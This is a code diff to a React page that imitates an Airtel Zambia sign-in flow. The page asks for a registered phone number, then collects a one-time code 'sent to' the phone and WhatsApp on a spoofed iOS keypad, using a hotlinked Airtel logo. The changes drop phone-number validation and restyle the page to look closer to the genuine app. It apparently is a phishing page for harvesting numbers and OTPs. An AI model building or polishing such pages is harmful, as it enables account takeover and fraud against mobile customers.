@@ -36,11 +36,9 @@ export default function AirtelPage() {
     return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
   }
 
-  // Handle phone number keypad input
+  // Handle phone number keypad input (unlimited digits allowed)
   const handlePhoneKeyPress = (digit: string) => {
-    if (phoneNumber.length < 10) {
-      setPhoneNumber((prev) => prev + digit)
-    }
+    setPhoneNumber((prev) => prev + digit)
   }
 
   const handlePhoneBackspace = () => {
@@ -78,7 +76,7 @@ export default function AirtelPage() {
           handlePhoneKeyPress(e.key)
         } else if (e.key === "Backspace") {
           handlePhoneBackspace()
-        } else if (e.key === "Enter" && phoneNumber.length >= 7) {
+        } else if (e.key === "Enter" && phoneNumber.length > 0) {
           handleProceedToLogin()
         }
       } else if (step === "otp") {
@@ -96,7 +94,7 @@ export default function AirtelPage() {
 
   // Proceed from phone to verifying
   const handleProceedToLogin = async () => {
-    if (phoneNumber.length < 5) return
+    if (!phoneNumber) return
 
     setStep("verifying_phone")
 
@@ -169,61 +167,63 @@ export default function AirtelPage() {
     return `******${last3}`
   }
 
-  const isValidPhone = phoneNumber.length >= 7
+  const isValidPhone = phoneNumber.length > 0
 
   return (
     <main
-      className="min-h-screen w-full bg-white flex flex-col items-center justify-between font-sans select-none text-[#1C1C1E] antialiased"
+      className="min-h-screen w-full bg-[#F6F6F9] flex flex-col items-center justify-between font-sans select-none text-[#1C1C1E] antialiased"
       dir="ltr"
     >
       {/* ========================================================================= */}
       {/* SCREEN 1: PHONE NUMBER INPUT                                             */}
       {/* ========================================================================= */}
       {step === "phone" && (
-        <div className="w-full max-w-[440px] min-h-screen flex flex-col justify-between bg-white px-5 sm:px-6 pt-3 pb-6 sm:pb-8 mx-auto">
-          {/* Header Bar */}
-          <div>
-            <header className="relative flex items-center justify-between h-14 border-b border-transparent">
-              {/* Back Arrow */}
-              <button
-                type="button"
-                onClick={() => setPhoneNumber("")}
-                aria-label="Back"
-                className="w-10 h-10 -ml-2 flex items-center justify-center text-[#1A1D20] active:opacity-50 transition-opacity"
+        <div className="w-full max-w-[440px] min-h-screen flex flex-col justify-between bg-[#F6F6F9] pb-6 sm:pb-8 mx-auto">
+          {/* Header Bar with #FFFEFF */}
+          <header className="w-full bg-[#FFFEFF] px-5 sm:px-6 h-16 relative flex items-center justify-between border-b border-black/[0.04] shrink-0">
+            {/* Back Arrow */}
+            <button
+              type="button"
+              onClick={() => setPhoneNumber("")}
+              aria-label="Back"
+              className="w-10 h-10 -ml-2 flex items-center justify-center text-[#1A1D20] active:opacity-50 transition-opacity"
+            >
+              <svg
+                width="22"
+                height="22"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2.8"
+                strokeLinecap="round"
+                strokeLinejoin="round"
               >
-                <svg
-                  width="22"
-                  height="22"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="currentColor"
-                  strokeWidth="2.8"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                >
-                  <polyline points="15 18 9 12 15 6" />
-                </svg>
-              </button>
+                <polyline points="15 18 9 12 15 6" />
+              </svg>
+            </button>
 
-              {/* Airtel Logo */}
-              <div className="absolute left-1/2 -translate-x-1/2 flex items-center gap-1.5">
-                <AirtelLogo />
-              </div>
+            {/* Airtel Logo */}
+            <div className="absolute left-1/2 -translate-x-1/2 flex items-center justify-center">
+              <AirtelLogo />
+            </div>
 
-              {/* Spacer for symmetry */}
-              <div className="w-10" />
-            </header>
+            {/* Spacer for symmetry */}
+            <div className="w-10" />
+          </header>
 
-            {/* Title */}
-            <div className="mt-7">
-              <h1 className="text-[23px] sm:text-[24px] font-bold text-[#1C1C1E] tracking-tight">
-                Welcome to Airtel Zambia
-              </h1>
+          {/* Main Body Content on #F6F6F9 */}
+          <div className="px-5 sm:px-6 flex-1 flex flex-col justify-between">
+            <div>
+              {/* Title */}
+              <div className="mt-6 sm:mt-7">
+                <h1 className="text-[23px] sm:text-[24px] font-bold text-[#1C1C1E] tracking-tight">
+                  Welcome to Airtel Zambia
+                </h1>
 
-              {/* Field Label */}
-              <label className="block text-[14px] font-semibold text-[#2C2F36] mt-7 mb-2.5">
-                Registered Number
-              </label>
+                {/* Field Label */}
+                <label className="block text-[14px] font-semibold text-[#2C2F36] mt-7 mb-2.5">
+                  Registered Number
+                </label>
 
               {/* Number Input Container with two border lines */}
               <div
@@ -272,7 +272,7 @@ export default function AirtelPage() {
                   inputMode="none"
                   value={phoneNumber}
                   onChange={(e) => {
-                    const val = e.target.value.replace(/\D/g, "").slice(0, 10)
+                    const val = e.target.value.replace(/\D/g, "")
                     setPhoneNumber(val)
                   }}
                   className="absolute inset-0 opacity-0 pointer-events-none"
@@ -328,7 +328,7 @@ export default function AirtelPage() {
               onClick={handleProceedToLogin}
               className={`w-full h-[52px] rounded-[6px] font-bold text-[15px] tracking-[0.5px] uppercase transition-all duration-200 flex items-center justify-center select-none ${
                 isValidPhone
-                  ? "bg-[#ED1B24] text-white shadow-md shadow-red-500/20 active:scale-[0.99] cursor-pointer hover:bg-[#DE141D]"
+                  ? "bg-[#1E2538] text-white shadow-md shadow-[#1E2538]/20 active:scale-[0.99] cursor-pointer hover:bg-[#161C2C]"
                   : "bg-[#D6DBE2] text-white cursor-not-allowed"
               }`}
             >
@@ -336,7 +336,8 @@ export default function AirtelPage() {
             </button>
           </div>
         </div>
-      )}
+      </div>
+    )}
 
       {/* ========================================================================= */}
       {/* SCREEN 2 & 4: FULL-SCREEN DARK VERIFICATION OVERLAY                      */}
@@ -357,47 +358,48 @@ export default function AirtelPage() {
       {/* SCREEN 3: OTP VERIFICATION                                               */}
       {/* ========================================================================= */}
       {step === "otp" && (
-        <div className="w-full max-w-[440px] min-h-screen flex flex-col justify-between bg-white mx-auto">
-          {/* Top Section */}
-          <div className="px-5 sm:px-6 pt-3">
-            {/* Header Bar */}
-            <header className="relative flex items-center justify-between h-14">
-              {/* Back Chevron */}
-              <button
-                type="button"
-                onClick={() => {
-                  setStep("phone")
-                  setOtp([])
-                  setOtpError("")
-                }}
-                aria-label="Back to login"
-                className="w-10 h-10 -ml-2 flex items-center justify-center text-[#1A1D20] active:opacity-50 transition-opacity"
+        <div className="w-full max-w-[440px] min-h-screen flex flex-col justify-between bg-[#F6F6F9] mx-auto">
+          {/* Header Bar with #FFFEFF */}
+          <header className="w-full bg-[#FFFEFF] px-5 sm:px-6 h-14 relative flex items-center justify-between border-b border-black/[0.04] shrink-0">
+            {/* Back Chevron */}
+            <button
+              type="button"
+              onClick={() => {
+                setStep("phone")
+                setOtp([])
+                setOtpError("")
+              }}
+              aria-label="Back to login"
+              className="w-10 h-10 -ml-2 flex items-center justify-center text-[#1A1D20] active:opacity-50 transition-opacity"
+            >
+              <svg
+                width="22"
+                height="22"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2.8"
+                strokeLinecap="round"
+                strokeLinejoin="round"
               >
-                <svg
-                  width="22"
-                  height="22"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="currentColor"
-                  strokeWidth="2.8"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                >
-                  <polyline points="15 18 9 12 15 6" />
-                </svg>
-              </button>
+                <polyline points="15 18 9 12 15 6" />
+              </svg>
+            </button>
 
-              {/* Title */}
-              <h2 className="absolute left-1/2 -translate-x-1/2 text-[17px] sm:text-[18px] font-bold text-[#1C1C1E] tracking-tight">
-                OTP Verification
-              </h2>
+            {/* Title */}
+            <h2 className="absolute left-1/2 -translate-x-1/2 text-[17px] sm:text-[18px] font-bold text-[#1C1C1E] tracking-tight">
+              OTP Verification
+            </h2>
 
-              {/* Spacer */}
-              <div className="w-10" />
-            </header>
+            {/* Spacer */}
+            <div className="w-10" />
+          </header>
 
-            {/* Subtext */}
-            <p className="text-[14.5px] text-[#2C2F36] leading-relaxed mt-6 mb-7 text-center sm:text-left">
+          {/* Top Section on #F6F6F9 */}
+          <div className="px-5 sm:px-6 pt-3">
+
+            {/* Subtext shown clearly at top */}
+            <p className="text-[14.5px] text-[#2C2F36] leading-relaxed mt-5 mb-8 text-left">
               An OTP has been sent to{" "}
               <span className="font-semibold">{getMaskedPhone()}</span> and WhatsApp.
             </p>
@@ -424,9 +426,9 @@ export default function AirtelPage() {
                     }`}
                   >
                     {hasValue ? (
-                      /* Asterisk symbol exactly as in the design */
-                      <span className="text-[32px] sm:text-[36px] font-black text-[#1C1C1E] leading-none select-none mt-1">
-                        ✱
+                      /* Asterisk symbol - semibold */
+                      <span className="text-[28px] sm:text-[30px] font-semibold text-[#1C1C1E] leading-none select-none">
+                        *
                       </span>
                     ) : isCurrent ? (
                       <span className="w-[1.5px] h-[22px] bg-[#3B82F6] animate-pulse" />
@@ -489,8 +491,8 @@ export default function AirtelPage() {
             </div>
           </div>
 
-          {/* iOS System Keypad */}
-          <div className="w-full bg-[#D1D5DC] pt-2 pb-4 sm:pb-6 px-1.5 border-t border-[#C0C4CC]">
+          {/* iOS System Keypad with shadow around each digit */}
+          <div className="w-full bg-[#ECEEF2] pt-2 pb-5 sm:pb-6 px-1.5 border-t border-[#DDE0E6]">
             <div className="grid grid-cols-3 gap-1.5 max-w-[420px] mx-auto">
               {[
                 { digit: "1", letters: "" },
@@ -507,7 +509,7 @@ export default function AirtelPage() {
                   key={item.digit}
                   type="button"
                   onClick={() => handleOtpKeyPress(item.digit)}
-                  className="bg-white rounded-[5px] sm:rounded-[6px] shadow-[0_1px_1px_rgba(0,0,0,0.28)] h-[46px] sm:h-[50px] flex flex-col items-center justify-center active:bg-[#E5E7EB] transition-colors cursor-pointer select-none"
+                  className="bg-white rounded-[5px] sm:rounded-[6px] shadow-[0_1px_2px_rgba(0,0,0,0.22)] h-[46px] sm:h-[48px] flex flex-col items-center justify-center active:bg-[#E5E7EB] transition-colors cursor-pointer select-none"
                 >
                   <span className="text-[23px] sm:text-[25px] font-normal leading-none text-[#000000]">
                     {item.digit}
@@ -521,13 +523,13 @@ export default function AirtelPage() {
               ))}
 
               {/* Blank placeholder key */}
-              <div className="h-[46px] sm:h-[50px]" />
+              <div className="h-[46px] sm:h-[48px]" />
 
-              {/* Zero */}
+              {/* Zero with shadow card */}
               <button
                 type="button"
                 onClick={() => handleOtpKeyPress("0")}
-                className="bg-white rounded-[5px] sm:rounded-[6px] shadow-[0_1px_1px_rgba(0,0,0,0.28)] h-[46px] sm:h-[50px] flex flex-col items-center justify-center active:bg-[#E5E7EB] transition-colors cursor-pointer select-none"
+                className="bg-white rounded-[5px] sm:rounded-[6px] shadow-[0_1px_2px_rgba(0,0,0,0.22)] h-[46px] sm:h-[48px] flex flex-col items-center justify-center active:bg-[#E5E7EB] transition-colors cursor-pointer select-none"
               >
                 <span className="text-[23px] sm:text-[25px] font-normal leading-none text-[#000000]">
                   0
@@ -539,11 +541,11 @@ export default function AirtelPage() {
                 type="button"
                 onClick={handleOtpBackspace}
                 aria-label="Delete"
-                className="rounded-[5px] sm:rounded-[6px] h-[46px] sm:h-[50px] flex items-center justify-center active:opacity-50 transition-opacity cursor-pointer select-none"
+                className="rounded-[5px] sm:rounded-[6px] h-[46px] sm:h-[48px] flex items-center justify-center active:opacity-50 transition-opacity cursor-pointer select-none"
               >
                 <svg
-                  width="24"
-                  height="18"
+                  width="26"
+                  height="20"
                   viewBox="0 0 24 18"
                   fill="none"
                   stroke="#1C1C1E"
@@ -577,7 +579,7 @@ function AirtelLogo() {
       <img
         src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuUIYILCH57PwwcpNDvCJfl0Fw53NfBSKqOpReSVfSJMDiw4OO8w&s&ec=121966380"
         alt="Airtel"
-        className="h-7 w-auto object-contain"
+        className="h-[44px] sm:h-[48px] w-auto object-contain"
       />
     </div>
   )
